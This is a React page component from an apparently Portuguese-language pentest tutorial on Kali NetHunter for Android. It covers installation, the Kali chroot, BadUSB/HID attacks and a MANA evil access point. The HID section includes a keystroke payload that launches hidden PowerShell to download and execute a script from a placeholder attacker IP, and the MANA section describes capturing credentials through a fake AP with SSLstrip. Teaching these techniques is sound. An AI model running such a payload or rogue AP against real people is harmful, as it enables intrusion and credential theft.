import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function NetHunter() {
    return (
      <PageContainer
        title="Kali NetHunter — Pentest Mobile"
        subtitle="Kali Linux completo no seu Android: pentest WiFi, BadUSB, HID attacks e muito mais."
        difficulty="avancado"
        timeToRead="12 min"
      >
        <AlertBox type="info" title="Pentest na palma da mão">
          NetHunter é a plataforma de pentest mobile mais completa. Transforma smartphones Android
          em dispositivos de pentest com todo o arsenal do Kali Linux.
        </AlertBox>

        <h2>O que é Kali NetHunter?</h2>
        <p>
          NetHunter é uma plataforma de pentest Android open-source baseada no Kali Linux.
          Roda em dispositivos Nexus, OnePlus, Samsung e outros. Oferece kernel customizado,
          chroot do Kali, app Android (NetHunter app) e suporte a ataques específicos de mobile.
        </p>

        <h2>Instalação</h2>
        <CodeBlock language="bash" code={'# Requisitos:\n# - Dispositivo Android com bootloader desbloqueado\n# - TWRP Recovery instalado\n# - Kernel NetHunter compatível\n\n# Verificar dispositivos suportados:\n# https://nethunter.kali.org/device-kernels.html\n\n# Passos gerais:\n# 1. Desbloquear bootloader\n# fastboot oem unlock\n\n# 2. Instalar TWRP\n# fastboot flash recovery twrp.img\n\n# 3. Flash do kernel NetHunter (via TWRP)\n\n# 4. Instalar app NetHunter (APK)\n\n# 5. Instalar chroot Kali (minimal, light ou full)'} />

        <h2>Funcionalidades Principais</h2>
        <CodeBlock language="bash" code={'# No app NetHunter (requer root):\n\n# Kali Chroot Manager\n# - Iniciar sessão Kali completa\n# - Acesso a todas as ferramentas do Kali\n\n# KeX (Kali Desktop Experience)\n# - Desktop gráfico do Kali no celular\n# - Acessar via VNC\n\n# BadUSB / HID\n# - Simular teclado USB quando conectado a PC\n# - Executar payloads automaticamente\n\n# MANA Wireless Toolkit\n# - Access Point Falso\n# - Captura de credenciais WiFi\n\n# Bluetooth Attacks\n# - BluetoothStack attacks\n# - Via chipset interno'} />

        <h2>Kali Chroot — Terminal Completo</h2>
        <CodeBlock language="bash" code={'# No NetHunter app → Kali Chroot Manager → Start\n# Ou via terminal:\n\n# Iniciar chroot\nbootkali\n\n# Dentro do chroot Kali:\nnmap -sV 192.168.1.0/24\nmsfconsole\nairmon-ng start wlan0\n\n# Instalar pacotes adicionais\napt update && apt install -y ferramenta\n\n# Exportar resultados\n# Compartilhar /sdcard/ entre Android e Kali chroot'} />

        <h2>HID Attack — Teclado USB Malicioso</h2>
        <CodeBlock language="bash" code={'# NetHunter HID Attacks (similar ao Rubber Ducky)\n# Conectar celular no PC via USB\n# No NetHunter app → HID Attacks\n\n# Exemplo de payload:\n# GUI r (Windows + R)\n# DELAY 500\n# STRING powershell -ep bypass -w hidden\n# ENTER\n# DELAY 1000\n# STRING IEX (New-Object Net.WebClient).DownloadString(\'http://SEU_IP/payload.ps1\')\n# ENTER\n\n# Scripts prontos em DuckScript:\n# https://github.com/hak5darren/USB-Rubber-Ducky'} />

        <h2>MANA — Evil Access Point</h2>
        <CodeBlock language="bash" code={'# No NetHunter app → MANA Wireless\n\n# Criar AP falso que aceita qualquer conexão\n# e captura credenciais de sites HTTP\n\n# Configurações:\n# SSID: qualquer nome (ou clonar AP próximo)\n# Upstream: WiFi externo ou sem internet\n# Captura: WPA, HTTP credentials, HTTPS (com SSLstrip)'} />

        <AlertBox type="success" title="NetHunter Store">
          O NetHunter tem sua própria loja de apps (nethunter.kali.org/nethunter-store)
          com apps de segurança curados: NetHunter, Shodan, cSploit, DriveDroid e mais.
        </AlertBox>
      </PageContainer>
    );
  }
  